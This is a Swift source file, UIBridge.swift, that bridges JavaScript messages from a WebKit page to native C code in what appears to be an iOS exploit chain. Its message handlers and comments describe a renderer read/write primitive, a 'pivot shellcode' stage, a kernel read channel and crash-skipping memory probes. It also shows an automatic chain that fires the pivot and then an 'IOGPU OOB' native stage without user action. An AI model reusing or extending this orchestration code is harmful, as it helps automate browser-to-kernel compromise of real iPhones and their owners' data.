import Foundation
// language: Swift, file: UIBridge.swift, target: iOS 26.2 / 23C55 / arm64e
// JS -> native message plumbing for the WebKit stage.
//   - RUNBEGIN / SELFTESTCLAIM / STATUS are control tags answered from C
//     (run identity is assigned in nk_jsbridge.c, not in JS).
//   - Ordinary log lines go to C synchronously (Documents/trace.log, fsync) and
//     are COALESCED into the UI: at most one flush per 100ms, last 200 lines.
//     Per-line @Published appends caused representable churn and page reloads.

import Foundation
import WebKit

enum NKBridge {
    static let handler = "nklog"

    struct Payload {
        let tag: String
        let msg: String

        init?(_ body: Any) {
            guard let dict = body as? [String: Any] else { return nil }
            guard let msg = dict["msg"] as? String else { return nil }
            let tag = dict["tag"] as? String ?? "JS"
            self.tag = tag
            self.msg = msg
        }
    }

    /* watchdog timestamps live here and are updated from didReceive —
       EVERY bridge message passes through it (the earlier version updated
       these inside forward(), which nothing calls: the watchdog never saw a
       timestamp move and never fired — the 19:30 black-page pass). */
    static var lastAnyAt = Date.distantPast
    static var lastScanAt = Date.distantPast
    static var huntAt = Date.distantPast   /* W-T3 pivot in flight (set by "W-T3 pivot begin") */
    static var pivotFired = false          /* one-shot guard: ECHO-OK pivot dispatch (mid-recon re-dispatch killed trace (2) run2) */
    static var autoChainFired = false      /* one-shot guard: native chain fires only after the pivot recon completes */

    static func touch(_ tag: String, _ msg: String) {
        lastAnyAt = Date()
        if tag == "SCAN" { lastScanAt = Date() }
        if msg.contains("W-T3 pivot begin") { huntAt = Date() }
        if msg.contains("watchdog disarmed") { huntAt = .distantPast }
    }

    static func forward(_ payload: Payload) {
        nk_jsbridge_log(payload.tag, payload.msg)
    }
}

/* Coalesced UI tail: ring buffer + 100ms timer, flushed on the main thread. */
final class NKBridgeSink {
    static let shared = NKBridgeSink()

    private var buffer: [String] = []
    private let cap = 200
    private var timer: Timer?

    private init() {}

    func post(_ line: String) {
        buffer.append(line)
        if buffer.count > cap { buffer.removeFirst(buffer.count - cap) }
        arm()
    }

    private func arm() {
        if timer != nil { return }
        timer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: false) { [weak self] _ in
            guard let self = self else { return }
            self.timer = nil
            let lines = self.buffer
            let text = lines.joined(separator: "\n")
            nk_async_main {
                AppState.shared.append(text)
            }
        }
    }
}

final class NKScriptMessageHandler: NSObject, WKScriptMessageHandler {
    func userContentController(_ userContentController: WKUserContentController,
                               didReceive message: WKScriptMessage) {
        guard let payload = NKBridge.Payload(message.body) else {
            nk_jsbridge_log("JSWARN", "unparsed bridge message")
            return
        }
        NKBridge.touch(payload.tag, payload.msg)   /* watchdog heartbeat source — every message */
        switch payload.tag {
        case "RUNBEGIN":
            let id = nk_run_begin(payload.msg)
            message.webView?.evaluateJavaScript("window.__setRunId(\(id))")
        case "SELFTESTCLAIM":
            let ok = nk_selftest_claim(nk_run_current()) != 0
            message.webView?.evaluateJavaScript("window.__onClaim(\(ok ? 1 : 0))")
        case "GETPATH":
            /* W-T3: the renderer cannot know the guest container UUID.
               The pivot shellcode path-string comes from here (absolute,
               so the WebContent sandbox needs no HOME of its own). */
            var buf = [CChar](repeating: 0, count: 512)
            nk_home_path("trace.log", &buf, 512)
            message.webView?.evaluateJavaScript("window.__nkTracePath=\(String(cString: buf).debugDescription)")
        case "HINT":
            /* B12 -> WebKit convergence: the kernel read channel supplies the
               wasm code mapping as a hex string (setCodeHint). The JS pivot
               then skips the pointer hunt and scans that region directly.
               Native push: WebKitHolder.shared.setCodeHint("0x..."). */
            WebKitHolder.shared.setCodeHint(payload.msg)
        case "GETDEAD":
            /* W-T3 hunt convergence: the probe candidate whose walk never
               closed (the page died on that page read) lives in
               Documents/wt3_dead.txt. The JS side skips every listed
               candidate so each reload advances the scan one lethal page
               deeper instead of dying on the same one forever. */
            var buf = [CChar](repeating: 0, count: 2048)
            let n = nk_probe_dead_list(&buf, 2048)
            let entries = n > 0 ? String(cString: buf) : ""
            /* same callback shape as SELFTESTCLAIM/__onClaim: setting the
               variable is not a signal — the JS promise resolves only when
               __onDead fires. The request was never sent before (22:10). */
            message.webView?.evaluateJavaScript("window.__wt3Dead=[" + entries + "]; if (window.__onDead) { window.__onDead(); }")
        case "CLRDEAD":
            nk_probe_dead_clear()
            message.webView?.evaluateJavaScript("window.__wt3Dead=[]")
        case "STATUS":
            nk_jsbridge_status(payload.msg)
        default:
            /* durable line first (fsync'd), then the coalesced UI tail */
            nk_jsbridge_log(payload.tag, payload.msg)
            if payload.tag == "RESULT" || payload.tag == "WARN" || payload.tag == "PHASE" {
                NKBridgeSink.shared.post("[\(payload.tag)] \(payload.msg)")
            }
            /* AUTO-PIVOT: the moment the page reports the W-T2 echo verdict
               (AAR/AAW proven in the renderer) fire W-T3 natively — no button,
               dj asked for the automatic chain. One-shot PER SESSION — the
               earlier unguarded version re-dispatched on every repeat ECHO OK
               and killed the recon mid-dive (trace (2) run2 blackhole). */
            if payload.tag == "RESULT", payload.msg.contains("ECHO OK"), !NKBridge.pivotFired {
                NKBridge.pivotFired = true
                Timer.scheduledTimer(withTimeInterval: 1.5, repeats: false) { _ in
                    WebKitHolder.shared.firePivot()
                }
            }
            /* AUTO-CHAIN (dj's order: pivot FIRST, IOGPU OOB only after): the
               WPROBE3 line is the recon's last stage — whatever it says, the
               write-probe suite is done and the recon held together. One-shot
               nk_chain_run 1 s later, on the runloop like the button path.
               Manual «Цепочка» button stays as the override. */
            if payload.tag == "WT3", payload.msg.contains("WPROBE3"), !NKBridge.autoChainFired {
                NKBridge.autoChainFired = true
                Timer.scheduledTimer(withTimeInterval: 1.0, repeats: false) { _ in
                    nk_chain_run()
                }
            }
        }
    }
}
